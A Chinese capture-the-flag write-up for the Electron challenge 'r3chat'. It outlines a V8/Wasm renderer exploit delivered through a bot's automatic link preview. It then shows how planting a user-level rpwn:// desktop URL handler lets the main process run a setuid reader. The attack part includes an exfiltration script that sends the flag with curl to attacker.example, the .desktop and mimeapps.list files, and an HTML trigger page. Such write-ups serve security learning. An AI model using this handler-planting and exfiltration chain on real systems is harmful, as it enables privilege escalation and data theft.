# r3chat

## 题目简述

r3chat 是一道 Electron 客户端利用题。服务端存在名为 `SexyGirl` 的机器人账号；向机器人私聊包含 URL 的消息后，客户端会在隐藏的 `<webview>` 中自动加载链接预览，因此攻击者不需要等待人工点击。

部署文件给出的权限边界比“拿到渲染进程命令执行”更严格：

- Electron 客户端以 UID 1001 的 `bot` 用户运行；
- `/flag` 属于 `root:root`，权限为 `0400`；
- `/readflag` 是 setuid-root 程序；
- `/opt/R3Chat` 整体只读，不能直接替换应用代码；
- Chromium 渲染进程设置了 `NoNewPrivs: 1`，从该进程启动 `/readflag` 时 setuid 不会生效；
- Electron 主进程没有继承这一限制，仍为 `NoNewPrivs: 0`。

所以完整目标分为两步：先利用隐藏预览页在渲染进程中获得原生命令执行，再把执行流转移到 Electron 主进程触发的桌面 URL 处理链中，让 `/readflag` 在允许 setuid 提权的上下文里运行。

## 解题过程

### 1. 利用自动预览进入渲染进程

攻击者托管一个恶意网页，再注册普通账号并把该 URL 私聊给机器人。机器人收到消息后会自动创建隐藏预览，恶意 JavaScript 因而在其 Electron 渲染进程内执行。

利用页需要使用 `SharedArrayBuffer`，服务端应返回跨源隔离相关响应头：

```http
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
Cache-Control: no-store
```

题目使用 Electron 33.4.11，对应 Chrome 130 和 V8 13.x。公开利用采用一条 V8/Wasm 漏洞链：

1. 用 `SharedArrayBuffer` 竞争 `WebAssembly.compileStreaming()`；
2. 构造对象地址泄漏和任意读写原语；
3. 泄漏 Electron 模块地址并计算 PIE 基址；
4. 改写 Wasm 函数的分派目标；
5. 通过短 ROP 链执行 `/bin/sh -c '<command>'`。

这里不必把与浏览器版本绑定的大段 Wasm 字节数组抄入正文；真正需要确认的是，这条链最终能以 `bot` 用户在渲染进程中执行命令。

### 2. 识别 `NoNewPrivs` 造成的假终点

直接在渲染进程中执行 `/readflag` 会失败。检查进程状态可见：

```text
NoNewPrivs: 1
```

Linux 的 `no_new_privs` 位一旦设置，当前进程及其子进程便不能通过 setuid 文件获得新权限。因此即使 `/readflag` 的权限是 `4755`，从渲染进程启动后仍然只是 UID 1001，无法读取 `0400` 的 `/flag`。

继续比较进程状态可以发现 Electron 主进程为：

```text
NoNewPrivs: 0
```

这说明漏洞利用本身已经成功，剩余问题是寻找一条由主进程或其桌面集成组件发起的命令执行路径。

### 3. 在用户目录植入自定义 URL 处理器

渲染进程虽然不能提权，但仍能写入 `/home/bot`。利用第一次命令执行写入以下文件：

```text
/home/bot/.local/bin/rpwn.sh
/home/bot/.local/share/applications/rpwn-preview.desktop
/home/bot/.config/mimeapps.list
/home/bot/.local/share/applications/mimeapps.list
```

`rpwn.sh` 负责执行 `/readflag` 并把输出回传到攻击者服务器，例如：

```sh
#!/bin/sh
{
    /usr/bin/id
    /usr/bin/grep NoNewPrivs /proc/$$/status 2>/dev/null || true
    /readflag 2>&1
} | /usr/bin/curl -sS -m 10 --data-binary @- https://attacker.example/flag
```

对应的桌面入口把 `rpwn://` 注册为自定义协议：

```ini
[Desktop Entry]
Type=Application
Name=preview
NoDisplay=true
Exec=/bin/sh /home/bot/.local/bin/rpwn.sh %u
MimeType=x-scheme-handler/rpwn;
```

两个 `mimeapps.list` 中指定默认处理程序：

```ini
[Default Applications]
x-scheme-handler/rpwn=rpwn-preview.desktop
```

也可以执行下面的命令刷新关联：

```sh
xdg-mime default rpwn-preview.desktop x-scheme-handler/rpwn
```

协议名应使用 `rpwn://`，不要使用 `r3pwn://`。后者会被 `xdg-open` 的协议名检测逻辑误判为普通文件路径，表现为：

```text
xdg-open: file 'r3pwn://diag' does not exist
```

在渲染进程里自行调用 `xdg-open rpwn://selftest` 只能证明处理器注册成功；它仍继承 `NoNewPrivs: 1`，所以不能作为最终触发方式。

### 4. 让 Electron 主进程触发外部协议

第二个恶意页面只需要让隐藏 `<webview>` 导航到未知协议。为提高触发稳定性，可以同时尝试直接导航、点击链接和创建 iframe：

```html
<script>
function trigger(i) {
    const url = "rpwn://go/" + Date.now() + "/" + i;
    try {
        location.href = url;
    } catch (e) {}

    try {
        const a = document.createElement("a");
        a.href = url + "a";
        document.body.appendChild(a);
        a.click();
    } catch (e) {}

    try {
        const frame = document.createElement("iframe");
        frame.src = url + "f";
        frame.style.display = "none";
        document.body.appendChild(frame);
    } catch (e) {}
}

for (let i = 0; i < 10; i++) {
    setTimeout(() => trigger(i), i * 100);
}
</script>
```

再次把该页面 URL 私聊给机器人。当 Chromium 遇到未知外部协议时，Electron 会把处理请求交给桌面环境，Linux 侧最终经 `xdg-open` 查找刚才植入的 `.desktop` 文件。此时进程链来自 Electron 主进程，脚本中的状态变为：

```text
uid=1001(bot) gid=1001(bot)
NoNewPrivs: 0
```

`/readflag` 因而能够获得有效 root 权限，读取 `/flag`，再由 `curl` 回传。公开复现得到的动态 flag 为：

```text
r3ctf{TRusteD_p4rtN3Rs_6R3@k-HEaRt5_@nD-S4nd6OxeS_WItH0ut_a_single_click0}
```

浏览器版本相关的完整 V8/Wasm 利用实现可参考公开题解：[hax1ng 的 r3chat writeup](https://github.com/hax1ng/r3ctf-2026-writeups/blob/master/pwn/r3chat.md)。其关键结论和权限绕过过程已经在上文完整概括，外链主要用于保留可复现的底层利用字节与发送脚本。

## 方法总结

这道题的决定性障碍是客户端原生利用与执行边界逃逸，因此归入 pwn，而不是只按“聊天应用”归到 Web。

利用链可以压缩为：

```text
私聊恶意 URL
  -> 机器人隐藏 webview 自动预览
  -> V8/Wasm 漏洞获得渲染进程 RCE
  -> 在 /home/bot 植入 rpwn:// 桌面处理器
  -> 再次预览并导航到 rpwn://
  -> Electron 主进程调用桌面 URL 处理链
  -> 处理脚本运行于 NoNewPrivs: 0
  -> setuid /readflag 生效并回传 flag
```

最容易误判的是把渲染进程 RCE 当作终点。面对 setuid 读 flag 程序时，应同时检查 UID、挂载与文件权限、seccomp、capability 以及 `/proc/<pid>/status` 中的 `NoNewPrivs`。Electron 题还必须区分渲染进程、主进程和桌面集成组件的权限上下文；本题正是通过可写的用户级 MIME/URL 关联，把已受限的渲染进程能力转移到了未设置 `no_new_privs` 的主进程路径。
